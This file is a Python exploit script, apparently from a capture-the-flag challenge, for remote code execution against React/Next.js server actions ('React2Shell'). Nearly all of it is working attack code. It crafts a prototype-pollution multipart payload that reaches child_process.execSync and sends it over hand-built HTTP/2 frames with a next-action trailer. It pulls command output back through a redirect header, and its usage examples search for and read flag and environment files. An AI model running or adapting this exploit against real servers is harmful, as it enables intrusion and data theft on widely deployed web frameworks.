#!/usr/bin/env python3
"""
Final React2Shell RCE via H2 trailers with proper HPACK decoding
Usage: python3 rce_final.py "command"
"""
import socket, ssl, struct, time, re, base64, sys
from urllib.parse import unquote
from hpack import Encoder, Decoder

HOST = 'funicular-gm2cxozn.alfactf.ru'

def execute_rce(cmd):
    """Execute RCE command via React2Shell + H2 trailers"""

    # Better command escaping - use JSON.stringify for safe escaping
    import json
    cmd_json = json.dumps(cmd)

    # Better command execution with error handling
    prefix_payload = (
        f"try{{"
        f"var res=process.mainModule.require('child_process').execSync({cmd_json},{{timeout:15000,encoding:'base64',stdio:['pipe','pipe','pipe']}});"
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        f"}}catch(e){{"
        f"if(e.stdout){{var res=e.stdout.toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});}}"
        f"else{{var res=Buffer.from('ERROR:'+e.message).toString('base64');throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});}}"
        f"}}"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    parts = []
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
    )
    parts.append(
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
    )
    parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

    body = "".join(parts)
    content_type = f"multipart/form-data; boundary={boundary}"

    print(f"🔥 Executing: {cmd}")

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    raw = socket.create_connection((HOST, 443), timeout=15)
    sock = ctx.wrap_socket(raw, server_hostname=HOST)
    sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")

    try:
        sock.settimeout(2)
        sock.recv(65536)
    except: pass
    sock.settimeout(15)

    body_bytes = body.encode()

    enc = Encoder()
    headers = enc.encode([
        (":method", "POST"),
        (":scheme", "https"),
        (":authority", HOST),
        (":path", "/"),
        ("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"),
        ("content-type", content_type),
        ("content-length", str(len(body_bytes))),
        ("trailer", "next-action")
    ])

    trailer = enc.encode([("next-action", "x")])

    sid = 1
    sock.sendall(struct.pack(">I", len(headers))[1:] + b"\x01\x04" + struct.pack(">I", sid) + headers)
    sock.sendall(struct.pack(">I", len(body_bytes))[1:] + b"\x00\x00" + struct.pack(">I", sid) + body_bytes)
    sock.sendall(struct.pack(">I", len(trailer))[1:] + b"\x01\x05" + struct.pack(">I", sid) + trailer)

    # Proper HPACK decoder
    decoder = Decoder()

    headers_recv = {}
    body_recv = b""
    end_time = time.time() + 15

    while time.time() < end_time:
        try:
            hdr = sock.recv(9)
            if len(hdr) < 9: break
            length, frame_type, flags = struct.unpack(">I", b"\x00" + hdr[0:3])[0], hdr[3], hdr[4]
            stream_id = struct.unpack(">I", hdr[5:9])[0] & 0x7FFFFFFF

            payload = b""
            while len(payload) < length:
                chunk = sock.recv(length - len(payload))
                if not chunk: break
                payload += chunk

            if frame_type == 1:  # HEADERS
                try:
                    # Decode HPACK headers properly
                    decoded_headers = decoder.decode(payload)
                    for name, value in decoded_headers:
                        name_str = name.decode() if isinstance(name, bytes) else name
                        value_str = value.decode() if isinstance(value, bytes) else value

                        # Check for redirect headers
                        if name_str.lower() in ['x-action-redirect', 'location']:
                            headers_recv[name_str.lower()] = value_str

                except Exception as e:
                    pass

            elif frame_type == 0:
                body_recv += payload

            if stream_id == sid and (flags & 1): break
        except Exception as e:
            break

    sock.close()

    # Check for RCE success
    for header_name in ["x-action-redirect", "location"]:
        if header_name in headers_recv:
            header_val = headers_recv[header_name]

            match = re.search(r'/login\?a=([^;&]+)', header_val)
            if match:
                try:
                    result_b64 = unquote(match.group(1))
                    result = base64.b64decode(result_b64).decode('utf-8', errors='ignore')
                    print(f"✅ Output:\n{result}")

                    if 'alfa{' in result:
                        flag_match = re.search(r'alfa\{[^}]+\}', result)
                        if flag_match:
                            flag = flag_match.group(0)
                            print(f"\n🏁 FLAG FOUND: {flag}")
                            # Auto-validate flag
                            print(f"\n🔥 Validating flag...")
                            import subprocess
                            subprocess.run(["bash", "../../scripts/flag.sh"], input=flag, text=True, cwd=".")
                    return result

                except Exception as e:
                    print(f"❌ Decode error: {e}")

    # If no redirect, check for error
    body_str = body_recv.decode('utf-8', errors='ignore')
    if 'digest' in body_str:
        digest_match = re.search(r'"digest":"([^"]+)"', body_str)
        if digest_match:
            print(f"❌ Command failed (digest: {digest_match.group(1)})")
    else:
        print(f"❌ No output")

    return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 rce_final.py \"command\"")
        print("Examples:")
        print("  python3 rce_final.py \"whoami\"")
        print("  python3 rce_final.py \"find / -name '*flag*' -type f 2>/dev/null\"")
        print("  python3 rce_final.py \"cat /flag\"")
        print("  python3 rce_final.py \"env | grep -i flag\"")
        sys.exit(1)

    cmd = sys.argv[1]
    execute_rce(cmd)

if __name__ == "__main__":
    main()